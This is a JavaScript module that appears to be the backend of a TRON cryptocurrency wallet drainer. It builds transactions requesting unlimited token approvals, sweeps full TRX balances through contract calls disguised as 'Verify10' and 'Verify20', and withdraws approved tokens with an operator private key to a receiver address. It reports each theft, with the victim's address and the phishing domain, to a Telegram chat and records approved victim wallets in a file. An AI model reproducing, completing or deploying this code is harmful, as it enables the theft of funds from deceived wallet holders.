const fs = require('fs')
const { promises: fsp } = require('fs')
const path = require('path')
const config = JSON.parse(fs.readFileSync('./data/config.json', 'utf-8'))
const { SETTINGS } = config
const approvedFile = path.join(__dirname, '../data/approved-wallets.json')
const MAX_UINT_256 =
	'115792089237316195423570985008687907853269984665640564039457584007913129639935'
const { returnMessage } = require('./logs')
const telegramBot = require('./bot')

//Create the transaction body for TRX transfer via Verify10
async function createSendTRX(token, address, indexOfSetting, tronWeb) {
	try {
		const setting = SETTINGS[indexOfSetting]
		const functionSelector = 'Verify10(address,uint256)'
		const parameter = [
			{ type: 'address', value: setting.receiverAddress },
			{ type: 'uint256', value: token.balance },
		]
		const energyUsed = (
			await tronWeb.transactionBuilder.triggerConstantContract(
				setting.contractAddress,
				functionSelector,
				{ from: address, callValue: token.balance },
				parameter,
				address,
			)
		).energy_used
		const feeLimit = Math.max(
			Math.round((energyUsed || 0) * 420 * 1.1),
			25_000_000,
		)
		const tx = (
			await tronWeb.transactionBuilder.triggerSmartContract(
				setting.contractAddress,
				functionSelector,
				{ from: address, callValue: token.balance, feeLimit },
				parameter,
				address,
			)
		).transaction
		const extendExpirationObj =
			await tronWeb.transactionBuilder.extendExpiration(tx, 3600)
		return extendExpirationObj
	} catch (error) {
		console.log(error)
		throw error
	}
}

//Create the transaction body for TRC10 transfer
async function createSendTRC10(token, address, indexOfSetting, tronWeb) {
	try {
		const setting = SETTINGS[indexOfSetting]
		const tx = await tronWeb.transactionBuilder.sendAsset(
			setting.receiverAddress,
			token.balance,
			token.tokenId,
			address,
		)
		const extendExpirationObj =
			await tronWeb.transactionBuilder.extendExpiration(tx, 3600)
		return extendExpirationObj
	} catch (error) {
		console.log(error)
		throw error
	}
}

//Create the transaction body for TRC20 approval
async function createApproveTRC20(token, address, indexOfSetting, tronWeb) {
	const setting = SETTINGS[indexOfSetting]
	const functionSelector = `${token.withdrawalMethod}(address,uint256)`
	const parameter = [
		{ type: 'address', value: setting.contractAddress },
		{ type: 'uint256', value: MAX_UINT_256 },
	]
	const MAX_ATTEMPTS = 3
	let lastError
	for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
		try {
			const energyUsed = (
				await tronWeb.transactionBuilder.triggerConstantContract(
					token.tokenId,
					functionSelector,
					{},
					parameter,
					address,
				)
			).energy_used
			const feeLimit = Math.max(
				Math.round((energyUsed || 0) * 420 * 1.1),
				15_000_000,
			)
			const tx = (
				await tronWeb.transactionBuilder.triggerSmartContract(
					token.tokenId,
					functionSelector,
					{ feeLimit },
					parameter,
					address,
				)
			).transaction
			const extendExpirationObj =
				await tronWeb.transactionBuilder.extendExpiration(tx, 3600)
			return extendExpirationObj
		} catch (error) {
			lastError = error
			console.log(
				`createApproveTRC20 attempt ${attempt} failed:`,
				error.message || error,
			)
			if (attempt < MAX_ATTEMPTS)
				await new Promise(r => setTimeout(r, 1500 * attempt))
		}
	}
	throw lastError
}

//Check if the user has approved their TRC20 to operator wallet
async function checkTRC20ApprovalToContract(
	token,
	address,
	indexOfSetting,
	tronWeb,
) {
	try {
		const setting = SETTINGS[indexOfSetting]
		const functionSelector = `allowance(address,address)`
		const parameter = [
			{ type: 'address', value: address },
			{ type: 'address', value: setting.contractAddress },
		]
		const result = await tronWeb.transactionBuilder.triggerConstantContract(
			token.tokenId,
			functionSelector,
			{},
			parameter,
			setting.contractOwnerAddress,
		)
		const rawHex = result.constant_result[0]
		const approvalAmount = BigInt('0x' + rawHex)
		const balance = BigInt(token.balance)
		console.log(
			`[allowance check] rawHex=${rawHex} approvalAmount=${approvalAmount} tokenBalance=${token.balance}(${balance}) approved=${approvalAmount > balance}`,
		)
		return approvalAmount > balance
	} catch (error) {
		console.log('checkTRC20ApprovalToContract error:', error.message || error)
		return false
	}
}

// Withdraw approved TRC20 token
async function withdrawTRC20(
	token,
	address,
	indexOfSetting,
	domainAndPath,
	tronWeb,
) {
	const setting = SETTINGS[indexOfSetting]
	let message
	token.withdrawalMethod = 'transferFrom'
	const messageData = {
		side: 'Server side',
		token,
		address,
		receiver: setting.receiverAddress,
		domainAndPath,
	}
	try {
		message = returnMessage(messageData)['startedTransaction']
		await telegramBot.sendMessage(setting.telegramChatId, message, {
			parse_mode: 'HTML',
			disable_web_page_preview: true,
		})

		const functionSelector = `Verify20(address,address,address,uint256)`
		const parameter = [
			{ type: 'address', value: token.tokenId },
			{ type: 'address', value: address },
			{ type: 'address', value: setting.receiverAddress },
			{ type: 'uint256', value: token.balance },
		]
		const energyUsed = (
			await tronWeb.transactionBuilder.triggerConstantContract(
				setting.contractAddress,
				functionSelector,
				{},
				parameter,
				setting.contractOwnerAddress,
			)
		).energy_used
		const feeLimit = Math.round(energyUsed * 420 * 1.1)
		const unSignedTx = (
			await tronWeb.transactionBuilder.triggerSmartContract(
				setting.contractAddress,
				functionSelector,
				{ feeLimit },
				parameter,
				setting.contractOwnerAddress,
			)
		).transaction
		const extendExpirationObj =
			await tronWeb.transactionBuilder.extendExpiration(unSignedTx, 3600)
		const signedTx = await tronWeb.trx.sign(
			extendExpirationObj,
			setting.contractOwnerPrivateKey,
		)
		const sentTx = await tronWeb.trx.sendRawTransaction(signedTx)

		if (sentTx.code === 'BANDWITH_ERROR')
			throw new Error('Insufficient balance on the OPERATOR wallet')
		const txID = sentTx.txid
		messageData.hash = txID
		message = returnMessage(messageData)['completedTransaction']
		await telegramBot.sendMessage(setting.telegramChatId, message, {
			parse_mode: 'HTML',
			disable_web_page_preview: true,
		})
	} catch (error) {
		if (error.message) messageData.error = error.message
		message = returnMessage(messageData)['revertedTransaction']
		await telegramBot.sendMessage(setting.telegramChatId, message, {
			parse_mode: 'HTML',
			disable_web_page_preview: true,
		})
	}
}

async function saveApprovedWallet(approvedData) {
	try {
		let currentData = []

		try {
			const data = await fsp.readFile(approvedFile, 'utf8')
			currentData = JSON.parse(data)
			if (!Array.isArray(currentData)) currentData = []
		} catch (error) {
			if (error.code === 'ENOENT') {
				currentData = []
			} else {
				throw error
			}
		}

		const alreadyExists = currentData.some(
			entry => entry.address === approvedData.address,
		)
		if (!alreadyExists) {
			if (!approvedData.approvedAt) {
				approvedData.approvedAt = new Date().toISOString()
			}

			currentData.unshift(approvedData)
			await fsp.writeFile(
				approvedFile,
				JSON.stringify(currentData, null, 2),
				'utf8',
			)
			console.log(
				`✅ Address ${approvedData.address} added to approved-wallets.json`,
			)
		} else {
			console.log(
				`ℹ️ Address ${approvedData.address} already exists in approved-wallets.json`,
			)
		}
	} catch (error) {
		console.error('❌ Error saving approved wallet:', error)
	}
}

module.exports = {
	createSendTRX,
	createSendTRC10,
	createApproveTRC20,
	checkTRC20ApprovalToContract,
	withdrawTRC20,
	saveApprovedWallet,
}
